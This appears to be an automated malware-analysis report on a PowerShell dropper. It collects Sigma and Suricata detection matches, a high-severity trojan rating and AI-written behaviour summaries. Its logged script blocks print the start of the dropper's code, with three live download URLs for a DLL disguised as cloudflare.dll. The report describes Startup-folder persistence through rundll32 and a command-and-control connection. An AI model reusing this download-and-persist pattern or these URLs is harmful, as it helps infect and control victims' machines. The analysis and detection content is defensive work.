sigma_analysis_results.rule_description: Detects specific process tree behavior of a "rundll32" execution often linked with potential Qakbot activity.

match_context.values: @{Hashes=MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=RUNDLL32.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows host process (Rundll32); FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_dll.bat" "; CommandLine=rundll32.exe  "C:\Users\Bruno\AppData\Roaming\cloudflare\cloudflare.dll", DllRegisterServer; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Pikabot Fake DLL Extension Execution Via Rundll32.EXE
sigma_analysis_results.rule_description: Detects specific process tree behavior linked to "rundll32" executions, wherein the associated DLL lacks a common ".dll" extension, often signaling potential Pikabot activity.
sigma_analysis_results.rule_author: Swachchhanda Shrawan Poudel, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=RUNDLL32.EXE; Hashes=MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC; Description=Windows host process (Rundll32); FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_dll.bat" "; CommandLine=rundll32.exe  "C:\Users\Bruno\AppData\Roaming\cloudflare\cloudflare.dll", DllRegisterServer; EventID=1; ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=CBFD746699A0C0D37597F91F3F4ED2CE6213025C,MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C; CurrentDirectory=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\; OriginalFileName=RUNDLL32.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows host process (Rundll32); EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_dll.bat" "; CommandLine=rundll32.exe  "C:\Users\Bruno\AppData\Roaming\cloudflare\cloudflare.dll", DllRegisterServer; FileVersion=10.0.22621.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects when a file with a suspicious extension is created in the startup folder

Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.
In it's default mode, it builds a self deleting .bat file which executes malicious command.
The detection rule relies on creation of the malicious bat file (debug.bat by default).

match_context.values:
@{ScriptBlockText=param([switch]$Silent = $true)

# Multiple download sources
$urls = @(
    "https://fundacion-cannabis-argentina.org/app/cf_update.dll",
    "https://ghenvironment.com/public/Images/cf_update.dll",
    "https://cmparazinho.rn.gov.br/img/cf_update.dll"
)

$destinationFile = "$env:APPDATA\cloudflare\cloudflare.dll"

# Create directory
New-Item -ItemType Directory -Path (Split-Path $destinationFile) -Force -ErrorAction SilentlyContinue

# Try each URL until one works
foreach ($url in [TRUNCATED]; MessageTotal=1; ScriptBlockId=bc76a442-5188-424d-881b-ffa1f8a6b261; Path=C:\Users\uScmQVSTGZaq\AppData\Local\Temp\5ab4d14fc87b635b2b65571971d3780e.ps1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects a rundll32 that communicates with public IP addresses

match_context.values: @{SourceIsIpv6=false; DestinationPort=22507; Initiated=true; Protocol=tcp; SourceIp=172.16.1.4; DestinationIsIpv6=false; EventID=3; Image=C:\Windows\System32\rundll32.exe; SourcePort=64813; DestinationIp=3.137.123.63}

sigma_analysis_results.rule_description: A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.

# Create directory

# Try each URL until one works

sigma_analysis_results.rule_title: Unsigned DLL Loaded by Windows Utility
sigma_analysis_results.rule_description:
Detects windows utilities loading an unsigned or untrusted DLL.
Adversaries often abuse those programs to proxy execution of malicious code.
Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)

match_context.values:
@{ScriptBlockText=param([switch]$Silent = $true)

# Multiple download sources
$urls = @(
    "https://fundacion-cannabis-argentina.org/app/cf_update.dll",
    "https://ghenvironment.com/public/Images/cf_update.dll",
    "https://cmparazinho.rn.gov.br/img/cf_update.dll"
)

$destinationFile = "$env:APPDATA\cloudflare\cloudflare.dll"

# Create directory
New-Item -ItemType Directory -Path (Split-Path $destinationFile) -Force -ErrorAction SilentlyContinue

# Try each URL until one works
foreach ($url in [TRUNCATED]; MessageTotal=1; ScriptBlockId=bc76a442-5188-424d-881b-ffa1f8a6b261; Path=C:\Users\uScmQVSTGZaq\AppData\Local\Temp\5ab4d14fc87b635b2b65571971d3780e.ps1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

Adversaries may abuse the Windows command shell for execution.
The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.
The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.
Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system

match_context.values:
@{ScriptBlockText=param([switch]$Silent = $true)

# Multiple download sources
$urls = @(
    "https://fundacion-cannabis-argentina.org/app/cf_update.dll",
    "https://ghenvironment.com/public/Images/cf_update.dll",
    "https://cmparazinho.rn.gov.br/img/cf_update.dll"
)

$destinationFile = "$env:APPDATA\cloudflare\cloudflare.dll"

# Create directory
New-Item -ItemType Directory -Path (Split-Path $destinationFile) -Force -ErrorAction SilentlyContinue

# Try each URL until one works
foreach ($url in [TRUNCATED]; Path=C:\Users\uScmQVSTGZaq\AppData\Local\Temp\5ab4d14fc87b635b2b65571971d3780e.ps1; ScriptBlockId=bc76a442-5188-424d-881b-ffa1f8a6b261; MessageTotal=1; MessageNumber=1; EventID=4104}

crowdsourced_ids_results.rule_category: Malware Command and Control Activity Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Havoc Demon CnC Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Havoc Demon CnC Request"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"|DE AD BE EF|"; offset:4; fast_pattern; content:"|00 00 00 63|"; distance:4; within:4; byte_jump:4,0, post_offset -1; isdataat:!2,relative; reference:url,zscaler.com/blogs/security-research/havoc-across-cyberspace; reference:url,fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor; classtype:command-and-control; sid:2056539; rev:1; metadata:attack_target Client_Endpoint, tls_state TLSDecrypt, created_at 2024_10_07, deployment Perimeter, confidence High, signature_severity Major, tag c2, updated_at 2024_10_08, mitre_tactic_id TA0010, mitre_tactic_name Exfiltration, mitre_technique_id T1041, mitre_technique_name Exfiltration_Over_C2_Channel;)

crowdsourced_ids_results.rule_msg: ET INFO DNS Query to a *.ngrok domain (ngrok.io)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO DNS Query to a *.ngrok domain (ngrok.io)"; dns.query; content:".ngrok.io"; fast_pattern; endswith; nocase; classtype:misc-activity; sid:2022642; rev:7; metadata:created_at 2016_03_23, deployment Perimeter, confidence Medium, signature_severity Informational, updated_at 2023_04_28;)

alert tls any any -> any any (msg:"SURICATA TLS invalid record type"; flow:established; app-layer-event:tls.invalid_record_type; flowint:tls.anomaly.count,+,1; classtype:protocol-command-decode; sid:2230002; rev:1;)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis:
The provided PowerShell code is designed to download a DLL file from multiple specified URLs and save it to a location within the user's AppData directory. The code attempts to create a directory for the downloaded file if it does not already exist. It then iterates through a list of URLs, attempting to download the file from each until one is successful. If the download is successful, it creates a batch file that is placed in the Windows Startup folder, which will execute the downloaded DLL using `rundll32.exe` upon system startup.

The use of multiple download sources suggests an attempt to ensure the file is retrieved even if one or more URLs are unavailable, which is a common tactic in malicious scripts to maintain persistence. The batch file created is set to run the DLL with the `DllRegisterServer` argument, which is often used to execute code within a DLL file, potentially allowing for arbitrary code execution.

The code also includes error handling to remove any partially downloaded or corrupted files, which indicates a level of sophistication aimed at maintaining a clean execution environment. The presence of a silent mode parameter (`$Silent`) suggests that the script can operate without user notification, further indicating malicious intent.

Overall, the behavior of the code aligns with characteristics commonly found in malware, particularly in its attempts to download and execute potentially harmful code without user consent or awareness.

The code first creates a directory structure within the user's APPDATA path. It then attempts to download a DLL file from a predefined list of HTTPS URLs. Upon a successful download, the file is saved as `cloudflare.dll` in the previously created APPDATA directory. Following a successful download, the script creates a batch file in the user's Startup folder. This batch file is designed to execute the downloaded DLL using `rundll32.exe` with the `DllRegisterServer` entry point after a brief delay. The script then pauses before initiating the execution of this newly created batch file. If all download attempts fail, the script terminates.
